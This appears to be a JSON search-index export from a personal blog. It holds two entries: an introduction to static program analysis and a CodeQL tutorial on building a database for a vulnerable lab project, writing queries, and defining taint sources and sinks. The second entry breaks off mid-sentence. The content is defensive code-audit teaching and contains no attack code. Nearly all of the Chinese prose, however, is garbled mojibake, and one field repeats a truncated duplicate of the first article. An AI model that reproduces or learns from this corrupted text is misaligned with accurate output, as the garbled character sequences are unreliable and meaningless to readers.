[
    {
        "title": "é™æ€ç¨‹åºåˆ†æåŸºç¡€",
        "link": "/My-Knowlege-Database/blog/sdl/sast/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/",
        "content": "é™æ€ç¨‹åºåˆ†æåŸºç¡€ é™æ€ç¨‹åºåˆ†æåŸºç¡€ï¼ˆStatic Program Analysisï¼Œç®€ç§°Static Analysisï¼‰\nPLä¸é™æ€åˆ†æ ç¼–ç¨‹è¯­è¨€ï¼ˆ PLï¼ŒProgramming Languagesï¼‰ï¼Œé™æ€åˆ†æå±äºPLä¸‹é¢çš„Applicationä¸‹çš„ä¸€ä¸ªåˆ†æ”¯\né™æ€ç¨‹åºåˆ†ææ˜¯ç¼–ç¨‹è¯­è¨€ä¸­åº”ç”¨å±‚é¢ä¸‹çš„ä¸€ä¸ªç»†åˆ†é¢†åŸŸï¼Œå®ƒæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ ¸å¿ƒå†…å®¹ï¼š\nåœ¨ç†è®ºéƒ¨åˆ†ï¼Œè€ƒè™‘çš„æ˜¯å¦‚ä½•è®¾è®¡ä¸€ä¸ªè¯­è¨€çš„è¯­æ³•å’Œè¯­ä¹‰ï¼Œå¦‚ä½•è®¾è®¡è¯­è¨€çš„ç±»å‹ç³»ç»Ÿç­‰ç­‰é—®é¢˜ï¼›æœ‰äº†è¯­è¨€çš„è¯­æ³•ã€è¯­ä¹‰å’Œç±»å‹ç³»ç»Ÿä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æ”¯æ’‘è¯­è¨€çš„è¿è¡Œã€‚å› æ­¤ï¼Œåœ¨ç¯å¢ƒéƒ¨åˆ†ï¼Œéœ€è¦è€ƒè™‘å¦‚ä½•ä¸ºè¿è¡Œä¸­çš„ç¨‹åºæä¾›è¿è¡Œæ—¶ç¯å¢ƒâ€”â€”å¦‚ä½•è®¾è®¡ç¼–è¯‘å™¨ï¼Œåœ¨è¿è¡Œæ—¶éœ€è¦æ€æ ·çš„æ”¯æŒï¼ˆå¦‚å†…å­˜çš„åˆ†é…ç®¡ç†ï¼‰ç­‰ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åˆ™å…³æ³¨å¦‚ä½•ä¿è¯è¯­è¨€æ‰€å†™å‡ºç¨‹åºçš„æ•ˆç‡ã€å®‰å…¨æ€§å’Œå¯é æ€§ï¼Œä¸»è¦è€ƒè™‘å¦‚ä½•å¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼ŒéªŒè¯å’Œåˆæˆï¼ˆå¦‚ä½•è‡ªåŠ¨åˆæˆä¸€ä¸ªç¨‹åºï¼‰\nç°åœ¨ç¼–ç¨‹è¯­è¨€æ— éä¸‰å¤§ç±»ï¼š\nå‘½ä»¤å¼ï¼ˆCã€C++ã€JAVAï¼‰ å‡½æ•°å¼ï¼ˆScalaã€Haskellï¼‰ é€»è¾‘å¼ï¼ˆPrologï¼‰ é‚£ä¹ˆè€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼š\næ•°åå¹´æ¥è¯­è¨€çš„æ ¸å¿ƒæ²¡æœ‰å˜åŒ–ï¼Œä½†è½¯ä»¶çš„è§„æ¨¡å’Œå¤æ‚æ€§å¢é•¿è¿…é€Ÿï¼Œå¦‚ä½•ä¿è¯ç¨‹åºçš„å¯é æ€§ï¼Ÿ\nè¿™ä¸ªæ—¶å€™å°±å¼•å‡ºäº†æˆ‘ä»¬çš„é™æ€ç¨‹åºåˆ†æ\né™æ€ç¨‹åºåˆ†æ é™æ€ç¨‹åºåˆ†æçš„ç”¨å¤„å¾ˆå¤šï¼š\næé«˜ç¨‹åºå¯é æ€§ï¼šæ¯”å¦‚é¿å…å†…å­˜æ³„æ¼ã€ç©ºæŒ‡é’ˆå¼•ç”¨ç­‰ æé«˜ç¨‹åºå®‰å…¨æ€§ï¼šé¿å…éšç§ä¿¡æ¯æ³„æ¼ã€é¿å…æ³¨å…¥æ”»å‡» ç¼–è¯‘ä¼˜åŒ–ï¼šæ­»ä»£ç æ¶ˆé™¤ã€å¾ªç¯ä¸å˜é‡çš„ç§»åŠ¨ ç¨‹åºç†è§£ï¼šä¾‹å¦‚ä½¿ç”¨IDEæ—¶ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨ä»£ç ä¸Šï¼ŒIDEèƒ½å¤ŸåŠ¨æ€åœ°åˆ†æå¹¶æç¤ºä½ æ‰€æ‚¬åœå¯¹è±¡çš„ç›¸å…³ä¿¡æ¯ï¼ŒèƒŒåä½¿ç”¨çš„æŠ€æœ¯å°±æ˜¯é™æ€ç¨‹åºåˆ†æ ä¸€å¥è¯æ¦‚æ‹¬ï¼Œåœ¨ç¨‹åºè¿è¡Œä¹‹å‰äº†è§£å®ƒçš„è¡Œä¸ºã€å®‰å…¨æ€§ç­‰ä¿¡æ¯\nåœ¨åº”ç”¨å®‰å…¨ï¼ˆSDLï¼‰é¢†åŸŸï¼ŒSASTå­¦ä¹ çš„åŸºç¡€ä¹Ÿæ˜¯é™æ€ç¨‹åºåˆ†æ\nè¿™é‡Œæœ‰ä¸¤ä¸ªæœ¯è¯­ï¼Œsoundå’Œtruth\nsoundï¼šå¯ä»¥ç†è§£ä¸ºæ— æ¼æŠ¥ truthï¼šå¯ä»¥ç†è§£ä¸ºæ— è¯¯æŠ¥ æ²¡æœ‰ä¸€ä¸ªå®Œç¾çš„çš„SASTå·¥å…·èƒ½å¤Ÿå®ç°0æ¼æŠ¥ä¸0è¯¯æŠ¥ï¼Œå¾€å¾€åªèƒ½å¦¥åä¸€ä¸ªæ¥æ¢å–å¦ä¸€ä¸ªï¼Œè€Œç»å¤§å¤šæ•°éƒ½æ˜¯å¦¥åtruthï¼Œæ¥ä¿è¯sound\nä¸¤ä¸ªè¯æ¥æ¦‚æ‹¬é™æ€åˆ†æï¼šæŠ½è±¡ï¼ˆabstractï¼‰+è¿‡è¿‘ä¼¼ï¼ˆover-approximationï¼‰ï¼š\næŠ½è±¡ï¼šæ¯”å¦‚ä»£ç é‡Œå˜é‡å¯èƒ½å–å€¼æ— é™å¤šï¼Œæˆ‘ä»¬æŠŠå®ƒå½’æˆå‡ ä¸ªé›†åˆï¼ˆæ¯”å¦‚â€œæ­£/è´Ÿ/é›¶/unknown/undefinedâ€ï¼‰ï¼Œè¿™å°±æ˜¯æŠ½è±¡\nè¿‡è¿‘ä¼¼ï¼š\nä»¥è¯­ä¹‰åˆ¤æ–­ä¸ºä¾‹ï¼Œa=9ï¼Œb=-1ï¼Œæœ¬æ¥a+b=8ï¼Œä½†æ˜¯åˆ†ææ—¶æ˜¯æŠ½è±¡ä¸º æ­£æ•°+è´Ÿæ•° æ‰€ä»¥åˆ¤æ–­ç»“æœä¸æ˜¯æ­£æ•°ï¼Œè€Œæ˜¯unknownï¼ˆå¦‚æœç”¨è¿™ä¸ªæ€è·¯åˆ†æè´Ÿæ•°çš„æ•°ç»„å¼•ç”¨é”™è¯¯ï¼Œå°±ä¼šå¯¼è‡´è¯¯æŠ¥ï¼‰\nä»¥æ§åˆ¶æµåˆ¤æ–­ä¸ºä¾‹ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š\nx = 1; if(input) y = 10; else y = -1; z = x + y; é‚£ä¹ˆä»–çš„control flowå¦‚ä¸‹ï¼š\nflowchart TD B[x = 1] --\u003eD[y = 10] B[x = 1] --\u003eE[y = -1] D --\u003e F[z = x + y] E --\u003e F é‚£ä¹ˆæŒ‰ç…§å‰é¢çš„æ€è·¯æ¥åˆ¤æ–­æ­£è´Ÿï¼Œæµç¨‹å°±æ˜¯è¿™æ ·ï¼š\nflowchart TD B[x = 1] --\u003eD[y = æ­£] B[x = 1] --\u003eE[y = è´Ÿ] D --\u003e F[y = unknown] E --\u003e F F --\u003e G[z = unknown] è¿™é‡Œå·¦è¾¹è·¯å¾„çš„y=æ­£ï¼Œå³è¾¹çš„y=è´Ÿï¼Œè€Œæµç¨‹ä¼šåˆå¹¶ï¼ˆmergingï¼‰äºæ˜¯yåˆå¹¶åä¸ºunknownï¼Œæ‰€ä»¥æœ€ç»ˆçš„z=unknown\næ€»ç»“ é™æ€ç¨‹åºåˆ†ææ˜¯åœ¨ä¸è¿è¡Œç¨‹åºçš„å‰æä¸‹ï¼Œé€šè¿‡å¯¹ç¨‹åºè¯­ä¹‰è¿›è¡ŒæŠ½è±¡å’Œè¿‡è¿‘ä¼¼æ¥æ¨æ–­å…¶å¯èƒ½è¡Œä¸ºçš„ä¸€ç±»æŠ€æœ¯ï¼Œæ ¸å¿ƒç›®æ ‡æ˜¯æå‡ç¨‹åºçš„å®‰å…¨æ€§ã€å¯é æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ç”±äºç¨‹åºçŠ¶æ€å’Œæ‰§è¡Œè·¯å¾„åœ¨ç†è®ºä¸Šæ˜¯æ— é™çš„ï¼Œé™æ€åˆ†æå¿…é¡»åœ¨ soundï¼ˆä¸æ¼æŠ¥ï¼‰ä¸ truthï¼ˆä¸è¯¯æŠ¥ï¼‰ ä¹‹é—´å–èˆï¼Œç°å®ä¸­çš„å·¥å…·é€šå¸¸é€‰æ‹©ç‰ºç‰²ç²¾åº¦æ¥ä¿è¯è¦†ç›–ç‡ã€‚è¿™ä¹Ÿæ˜¯è¯¯æŠ¥ä¸å¯é¿å…çš„æ ¹æœ¬åŸå› ã€‚ç†è§£è¿™ä¸€ç‚¹ï¼Œæœ‰åŠ©äºæ­£ç¡®çœ‹å¾… SAST å·¥å…·çš„èƒ½åŠ›è¾¹ç•Œï¼Œå¹¶åœ¨è§„åˆ™è®¾è®¡ä¸ç»“æœåˆ†æä¸­åšå‡ºç†æ€§çš„å·¥ç¨‹åˆ¤æ–­\n",
        "summary": "é™æ€ç¨‹åºåˆ†æåŸºç¡€ é™æ€ç¨‹åºåˆ†æåŸºç¡€ï¼ˆStatic Program Analysisï¼Œç®€ç§°Static Analysisï¼‰\nPLä¸é™æ€åˆ†æ ç¼–ç¨‹è¯­è¨€ï¼ˆ PLï¼ŒProgramming Languagesï¼‰ï¼Œé™æ€åˆ†æå±äºPLä¸‹é¢çš„Applicationä¸‹çš„ä¸€ä¸ªåˆ†æ”¯\né™æ€ç¨‹åºåˆ†ææ˜¯ç¼–ç¨‹è¯­è¨€ä¸­åº”ç”¨å±‚é¢ä¸‹çš„ä¸€ä¸ªç»†åˆ†é¢†åŸŸï¼Œå®ƒæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ ¸å¿ƒå†…å®¹ï¼š\nåœ¨ç†è®ºéƒ¨åˆ†ï¼Œè€ƒè™‘çš„æ˜¯å¦‚ä½•è®¾è®¡ä¸€ä¸ªè¯­è¨€çš„è¯­æ³•å’Œè¯­ä¹‰ï¼Œå¦‚ä½•è®¾è®¡è¯­è¨€çš„ç±»å‹ç³»ç»Ÿç­‰ç­‰é—®é¢˜ï¼›æœ‰äº†è¯­è¨€çš„è¯­æ³•ã€è¯­ä¹‰å’Œç±»å‹ç³»ç»Ÿä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æ”¯æ’‘è¯­è¨€çš„è¿è¡Œã€‚å› æ­¤ï¼Œåœ¨ç¯å¢ƒéƒ¨åˆ†ï¼Œéœ€è¦è€ƒè™‘å¦‚ä½•ä¸ºè¿è¡Œä¸­çš„ç¨‹åºæä¾›è¿è¡Œæ—¶ç¯å¢ƒâ€”â€”å¦‚ä½•è®¾è®¡ç¼–è¯‘å™¨ï¼Œåœ¨è¿è¡Œæ—¶éœ€è¦æ€æ ·çš„æ”¯æŒï¼ˆå¦‚å†…å­˜çš„åˆ†é…ç®¡ç†ï¼‰ç­‰ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åˆ™å…³æ³¨å¦‚ä½•ä¿è¯è¯­è¨€æ‰€å†™å‡ºç¨‹åºçš„æ•ˆç‡ã€å®‰å…¨æ€§å’Œå¯é æ€§ï¼Œä¸»è¦è€ƒè™‘å¦‚ä½•å¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼ŒéªŒè¯å’Œåˆæˆï¼ˆå¦‚ä½•è‡ªåŠ¨åˆæˆä¸€ä¸ªç¨‹åºï¼‰\nç°åœ¨ç¼–ç¨‹è¯­è¨€æ— éä¸‰å¤§ç±»ï¼š\nå‘½ä»¤å¼ï¼ˆCã€C++ã€JAVAï¼‰ å‡½æ•°å¼ï¼ˆScalaã€Haskellï¼‰ é€»è¾‘å¼ï¼ˆPrologï¼‰ é‚£ä¹ˆè€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼š\næ•°åå¹´æ¥è¯­è¨€çš„æ ¸å¿ƒæ²¡æœ‰å˜åŒ–ï¼Œä½†è½¯ä»¶çš„è§„æ¨¡å’Œå¤æ‚æ€§å¢é•¿è¿…é€Ÿï¼Œå¦‚ä½•ä¿è¯ç¨‹åºçš„å¯é æ€§ï¼Ÿ\nè¿™ä¸ªæ—¶å€™å°±å¼•å‡ºäº†æˆ‘ä»¬çš„é™æ€ç¨‹åºåˆ†æ\né™æ€ç¨‹åºåˆ†æ é™æ€ç¨‹åºåˆ†æçš„ç”¨å¤„å¾ˆå¤šï¼š\næé«˜ç¨‹åºå¯é æ€§ï¼šæ¯”å¦‚é¿å…å†…å­˜æ³„æ¼ã€ç©ºæŒ‡é’ˆå¼•ç”¨ç­‰ æé«˜ç¨‹åºå®‰å…¨æ€§ï¼šé¿å…éšç§ä¿¡æ¯æ³„æ¼ã€é¿å…æ³¨å…¥æ”»å‡» ç¼–è¯‘ä¼˜åŒ–ï¼šæ­»ä»£ç æ¶ˆé™¤ã€å¾ªç¯ä¸å˜é‡çš„ç§»åŠ¨ ç¨‹åºç†è§£ï¼šä¾‹å¦‚ä½¿ç”¨IDEæ—¶ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨ä»£ç ä¸Šï¼ŒIDEèƒ½å¤ŸåŠ¨æ€åœ°åˆ†æå¹¶æç¤ºä½ æ‰€æ‚¬åœå¯¹è±¡çš„ç›¸å…³ä¿¡æ¯ï¼ŒèƒŒåä½¿ç”¨çš„æŠ€æœ¯å°±æ˜¯é™æ€ç¨‹åºåˆ†æ ä¸€å¥è¯æ¦‚æ‹¬ï¼Œåœ¨ç¨‹åºè¿è¡Œä¹‹å‰äº†è§£å®ƒçš„è¡Œä¸ºã€å®‰å…¨æ€§ç­‰ä¿¡æ¯\nåœ¨åº”ç”¨å®‰å…¨ï¼ˆSDLï¼‰é¢†åŸŸï¼ŒSASTå­¦ä¹ çš„åŸºç¡€ä¹Ÿæ˜¯é™æ€ç¨‹åºåˆ†æ\nè¿™é‡Œæœ‰ä¸¤ä¸ªæœ¯è¯­ï¼Œsoundå’Œtruth\nsoundï¼šå¯ä»¥ç†è§£ä¸ºæ— æ¼æŠ¥ truthï¼šå¯ä»¥ç†è§£ä¸ºæ— è¯¯æŠ¥ æ²¡æœ‰ä¸€ä¸ªå®Œç¾çš„çš„SASTå·¥å…·èƒ½å¤Ÿå®ç°0æ¼æŠ¥ä¸0è¯¯æŠ¥ï¼Œå¾€å¾€åªèƒ½å¦¥åä¸€ä¸ªæ¥æ¢å–å¦ä¸€ä¸ªï¼Œè€Œç»å¤§å¤šæ•°éƒ½æ˜¯å¦¥åtruthï¼Œæ¥ä¿è¯sound\nä¸¤ä¸ªè¯æ¥æ¦‚æ‹¬é™æ€åˆ†æï¼šæŠ½è±¡ï¼ˆabstractï¼‰+è¿‡è¿‘ä¼¼ï¼ˆover-approximationï¼‰ï¼š\næŠ½è±¡ï¼šæ¯”å¦‚ä»£ç é‡Œå˜é‡å¯èƒ½å–å€¼æ— é™å¤šï¼Œæˆ‘ä»¬æŠŠå®ƒå½’æˆå‡ ä¸ªé›†åˆï¼ˆæ¯”å¦‚â€œæ­£/è´Ÿ/é›¶/unknown/undefinedâ€ï¼‰ï¼Œè¿™å°±æ˜¯æŠ½è±¡\nè¿‡è¿‘ä¼¼ï¼š\nä»¥è¯­ä¹‰åˆ¤æ–­ä¸ºä¾‹ï¼Œa=9ï¼Œb=-1ï¼Œæœ¬æ¥a+b=8ï¼Œä½†æ˜¯åˆ†ææ—¶æ˜¯æŠ½è±¡ä¸º æ­£æ•°+è´Ÿæ•° æ‰€ä»¥åˆ¤æ–­ç»“æœä¸æ˜¯æ­£æ•°ï¼Œè€Œæ˜¯unknownï¼ˆå¦‚æœç”¨è¿™ä¸ªæ€è·¯åˆ†æè´Ÿæ•°çš„æ•°ç»„å¼•ç”¨é”™è¯¯ï¼Œå°±ä¼šå¯¼è‡´è¯¯æŠ¥ï¼‰\nä»¥æ§åˆ¶æµåˆ¤æ–­ä¸ºä¾‹ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š\nx = 1; if(input) y = 10; else y = -1; z = x + y; é‚£ä¹ˆä»–çš„control flowå¦‚ä¸‹ï¼š\nflowchart TD B[x = 1] --\u003eD[y = 10] B[x = 1] --\u003eE[y = -1] D --\u003e F[z = x + y] E --\u003e F é‚£ä¹ˆæŒ‰ç…§å‰é¢çš„æ€è·¯æ¥åˆ¤æ–­æ­£è´Ÿï¼Œæµç¨‹å°±æ˜¯è¿™æ ·ï¼š\n"
    }
,
    {
        "title": "CodeQLåŸºç¡€",
        "link": "/My-Knowlege-Database/blog/sdl/sast/codeql/codeql%E5%9F%BA%E7%A1%80/",
        "content": "CodeQLåŸºç¡€ é…ç½® ç®€å•è¯´ä¸€ä¸‹ç¯å¢ƒé…ç½®\nå¼•æ“åœ°å€ï¼šhttps://github.com/github/codeql-cli-binaries/releasesï¼Œä¸‹è½½åé…ç½®ç¯å¢ƒå˜é‡ï¼š\nç„¶åå®‰è£…sdkï¼šhttps://github.com/github/codeqlï¼Œæ”¹åæˆqlï¼Œæ”¾åœ¨ä¹‹å‰å¼•æ“çš„åŒç›®å½•ä¸‹ï¼š\nç„¶ååœ¨vscodeå®‰è£…æ’ä»¶ï¼š\nåœ¨è®¾ç½®é‡Œæ·»åŠ ä¸€ä¸‹CodeQLå¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®ï¼š\nç”¨CodeQLåˆ†æé¡¹ç›®æœ¬è´¨æ˜¯æ‰§è¡ŒæŸ¥è¯¢ï¼Œé¦–å…ˆéœ€è¦å»å¾…å®¡è®¡æºä»£ç çš„æ ¹ç›®å½•å»ºç«‹åˆ†ææ•°æ®åº“ï¼Œæˆ‘è¿™é‡Œåˆ†æçš„ä¸€ä¸ªå¼€æºçš„æ¼æ´åˆé›†ï¼šhttps://github.com/l4yn3/micro_service_seclab/\né¦–å…ˆè¦å»ºç«‹åˆ†ææ•°æ®åº“ï¼š\ncodeql database create javaseclabstest --language=\u0026#34;java\u0026#34; --command=\u0026#34;mvn clean install -Dmaven.test.skip=true\u0026#34; --source-root=/Users/yuy0ung/Desktop/SAST/micro_service_seclab-main æ‰§è¡ŒæˆåŠŸä½ åº”è¯¥å¯ä»¥åœ¨è¿™ä¸ªç›®å½•é‡Œçœ‹åˆ°ä¸€ä¸ªcodeqltestç›®å½•:\næ¥ç€æˆ‘ä»¬åœ¨vscodeå¼•å…¥è¿™ä¸ªç›®å½•ï¼š\nç„¶åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªqueryï¼š demo.qlï¼Œå†…å®¹ä¸ºselect \u0026quot;Hello Worldâ€œï¼Œä½ç½®ä¸ºCodeQL/ql/java/ql/examples/test.ql\næ¥ä¸‹æ¥è¿è¡Œqueryï¼š å¯ä»¥çœ‹åˆ°ç»“æœè¾“å‡ºäº†hello worldï¼Œè¯´æ˜é…ç½®æ²¡æœ‰é—®é¢˜äº†\nCodeQLåŸºç¡€è¯­æ³• qlè¯­æ³• è¯´ç™½äº†å°±æ˜¯æŸ¥è¯¢è¯­æ³•ï¼ŒQLæŸ¥è¯¢çš„è¯­æ³•ç»“æ„ä¸ºï¼š\nfrom [datatype] var where condition(var = something) select var æ¯”å¦‚ï¼š\nimport java from int i where i = 1 select i ç¬¬ä¸€è¡Œè¡¨ç¤ºæˆ‘ä»¬è¦å¼•å…¥CodeQLçš„ç±»åº“ï¼Œå› ä¸ºæˆ‘ä»¬åˆ†æçš„é¡¹ç›®æ˜¯javaçš„ï¼Œæ‰€ä»¥è¦import javaï¼ˆå¦‚æœQLæ–‡ä»¶åœ¨ ql\\java\\ql\\ ç›®å½•ä¸­æ—¶å°±ä¸éœ€è¦ import java äº†ï¼Œå› ä¸ºè¿™æ˜¯ CodeQL æ ‡å‡†åº“ç›®å½•ï¼Œå…¶ä¼šè‡ªåŠ¨éšå¼åŠ è½½è¯¥ç›®å½•ä¸‹çš„ä¾èµ–ï¼Œä½†å¦‚æœå†™åœ¨å…¶ä»–ç›®å½•ä¸‹å°±éœ€è¦æ‰‹åŠ¨ import java ï¼ŒåŒ…æ‹¬å…¶å­ç›®å½•ï¼‰ ç¬¬ä¸‰è¡Œè¡¨ç¤ºå®šä¹‰ä¸€ä¸ªintå‹å˜é‡iï¼Œè¡¨ç¤ºæˆ‘ä»¬è·å–æ‰€æœ‰çš„intç±»å‹çš„æ•°æ® ç¬¬å››è¡Œä¸ºåˆ¤å®šæ¡ä»¶ ç¬¬äº”è¡Œä¸ºè¾“å‡ºi ä¹Ÿå°±æ˜¯è¯´åœ¨æ‰€æœ‰çš„æ•´å½¢æ•°å­—iä¸­ï¼Œå½“i==1çš„æ—¶å€™ï¼Œå°±è¾“å‡ºiï¼ŒæŒ‰ç…§è¿™ä¸ªé€»è¾‘ï¼Œæœ€ç»ˆçš„è¾“å‡ºå°±åº”è¯¥ä¸º1: åˆ°è¿™é‡Œæˆ‘ä»¬ä¸éš¾çœ‹å‡ºæ¥CodeQLè§„åˆ™ç¼–å†™æ€è·¯ï¼šæŸ¥è¯¢çš„åŒºåŸŸ-\u0026gt;è¿‡æ»¤è§„åˆ™-\u0026gt;è¾“å‡º\nç±»åº“ ä¸Šé¢è¯´äº†CodeQLå¼•æ“ä¼šå°†ä»£ç è½¬æ¢ä¸ºæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“å…¶å®å°±æ˜¯å¯è¯†åˆ«çš„ASTæ•°æ®åº“\nåœ¨ASTé‡Œé¢Methodä»£è¡¨çš„å°±æ˜¯ç±»å½“ä¸­çš„æ–¹æ³•ï¼›æ¯”å¦‚è¯´æˆ‘ä»¬é¡¹ç›®çš„æ‰€æœ‰çš„æ–¹æ³•è°ƒç”¨ï¼ŒMethodAccessè·å–çš„å°±æ˜¯æ‰€æœ‰çš„æ–¹æ³•è°ƒç”¨ ä¸‹é¢æ˜¯å¸¸ç”¨çš„ç±»åº“ï¼š\nMethod æ–¹æ³•ç±»ï¼ŒMethod methodè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®ä¸­æ‰€æœ‰çš„æ–¹æ³• MethodAccess æ–¹æ³•è°ƒç”¨ç±»ï¼ŒMethodAccess callè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨ Parameter å‚æ•°ç±»ï¼ŒParameterè¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­æ‰€æœ‰çš„å‚æ•° ç°åœ¨è·å–é¡¹ç›®å½“ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼š\nimport java from Method i select i å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„æ–¹æ³•éƒ½è¢«æŸ¥è¯¢å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥è¿ç”¨ä¸‹é¢çš„è¯­æ³•ï¼š\nhashName() åˆ¤æ–­åå­—æ˜¯å¦åŒ¹é… getName() è·å–å½“å‰æ–¹æ³•çš„åç§° getDeclaringType() è·å–å½“å‰æ–¹æ³•æ‰€å±classçš„åç§° å¯ä»¥å¾—åˆ°è¿™æ ·çš„æŸ¥è¯¢è¯­å¥ï¼š\nimport java from Method i where i.hasName(\u0026#34;delete\u0026#34;) select i.getName(), i.getDeclaringType() å¯ä»¥æŸ¥è¯¢å‡ºæ¥æ‰€æœ‰åä¸ºdeleteçš„æ–¹æ³•ï¼š\nè°“è¯ å¦‚æœé™åˆ¶æ¡ä»¶æ¯”è¾ƒå¤šï¼Œwhere è¯­å¥å°±ä¼šå¾ˆå†—é•¿ï¼ŒCodeQLæä¾›ä¸€ç§æœºåˆ¶å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŠŠå¾ˆé•¿çš„æŸ¥è¯¢è¯­å¥å°è£…æˆå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå°±å«è°“è¯\næ¯”å¦‚ä¸Šé¢çš„demoæˆ‘ä»¬å¯ä»¥æ”¹æˆè¿™æ ·ï¼š\nimport java # predicate è¡¨ç¤ºå½“å‰æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ predicate isDel(Method i) { i.getName()=\u0026#34;delete\u0026#34; } from Method i where isDel(i) select i.getName(), i.getDeclaringType() æŸ¥è¯¢æ•ˆæœä¹Ÿæ˜¯ä¸€æ ·çš„ï¼š è®¾ç½®Sourceä¸Sink åœ¨ä»£ç è‡ªåŠ¨åŒ–å®‰å…¨å®¡è®¡çš„ç†è®ºå½“ä¸­ï¼Œæœ‰ä¸€ä¸ªæœ€æ ¸å¿ƒçš„ä¸‰å…ƒç»„æ¦‚å¿µï¼Œå°±æ˜¯(sourceï¼Œsinkå’Œsanitizer)\nsourceæ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„è¾“å…¥ç‚¹ã€‚æ¯”å¦‚è·å–httpè¯·æ±‚çš„å‚æ•°éƒ¨åˆ†ï¼Œå°±æ˜¯éå¸¸æ˜æ˜¾çš„Source\nsinkæ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„æ‰§è¡Œç‚¹ï¼Œæ¯”å¦‚SQLæ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡ŒSQLè¯­å¥çš„å‡½æ•°å°±æ˜¯sink(è¿™ä¸ªå‡½æ•°å¯èƒ½å«queryæˆ–è€…exeSqlï¼Œæˆ–è€…å…¶å®ƒ)\nsanitizeråˆå«å‡€åŒ–å‡½æ•°ï¼Œæ˜¯æŒ‡åœ¨æ•´ä¸ªçš„æ¼æ´é“¾æ¡å½“ä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ–¹æ³•é˜»æ–­äº†æ•´ä¸ªä¼ é€’é“¾ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±å«sanitizerï¼Œä¹Ÿå°±æ˜¯waf\nåªæœ‰å½“sourceå’ŒsinkåŒæ—¶å­˜åœ¨ï¼Œå¹¶ä¸”ä»sourceåˆ°sinkçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæ‰è¡¨ç¤ºå½“å‰æ¼æ´æ˜¯å­˜åœ¨çš„\nSourceç‚¹ åœ¨CodeQLä¸­æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è®¾ç½®Sourceï¼š\noverride predicate isSource(DataFlow::Node src) {} æˆ‘çš„é¡¹ç›®ä½¿ç”¨çš„æ˜¯Spring Bootæ¡†æ¶ï¼Œé‚£ä¹ˆsourceå°±æ˜¯httpå‚æ•°å…¥å£çš„ä»£ç å‚æ•°ï¼Œæ¯”å¦‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œsourceå°±æ˜¯usernameï¼š\n@RequestMapping(value = \u0026#34;/one\u0026#34;) public List\u0026lt;Student\u0026gt; one(@RequestParam(value = \u0026#34;username\u0026#34;) String username) { return indexLogic.getStudent(username); } è¿™é‡Œæˆ‘ä»¬è®¾ç½®ä¸ºï¼š\noverride predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } RemoteFlowSource æ˜¯ CodeQL æ ‡å‡†åº“ä¸­é¢„å®šä¹‰çš„ â€œè¿œç¨‹æ•°æ®æºâ€ ç±»ï¼Œæ¯”å¦‚HTTP è¯·æ±‚å‚æ•°ï¼Œç”¨æˆ·è¾“å…¥ä»¥åŠå…¶ä»–å¤–éƒ¨è¾“å…¥ç­‰éƒ½æ˜¯\nè¿™æ˜¯SDKè‡ªå¸¦çš„è§„åˆ™ï¼Œé‡Œé¢åŒ…å«äº†å¤§å¤šå¸¸ç”¨çš„Sourceå…¥å£ã€‚æˆ‘ä»¬ä½¿ç”¨çš„SpringBootä¹ŸåŒ…å«åœ¨å…¶ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚\næ³¨: instanceof è¯­æ³•æ˜¯CodeQLæä¾›çš„è¯­æ³•ï¼Œåé¢åœ¨CodeQLè¿›é˜¶éƒ¨åˆ†ä¼šæåˆ°ï¼Œè¿™é‡Œå°±æ˜¯æ£€æŸ¥è·å¾—çš„ src æ˜¯å¦ä¸º RemoteFlowSource\nSinkç‚¹ é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è®¾ç½®Sink\noverride predicate isSink(DataFlow::Node sink) {} åœ¨å®é™…ä¸­ï¼Œæˆ‘ä»¬æœ€åéƒ½æ˜¯è§¦å‘åˆ°æŸä¸ªæ¶æ„æ–¹æ³•ï¼Œå¦‚ getterï¼Œsetterï¼Œæ‰€ä»¥ sink åº”è¯¥æ˜¯ä¸ªæ–¹æ³•ï¼Œå‡è®¾æˆ‘ä»¬è¿™é‡Œçš„sink 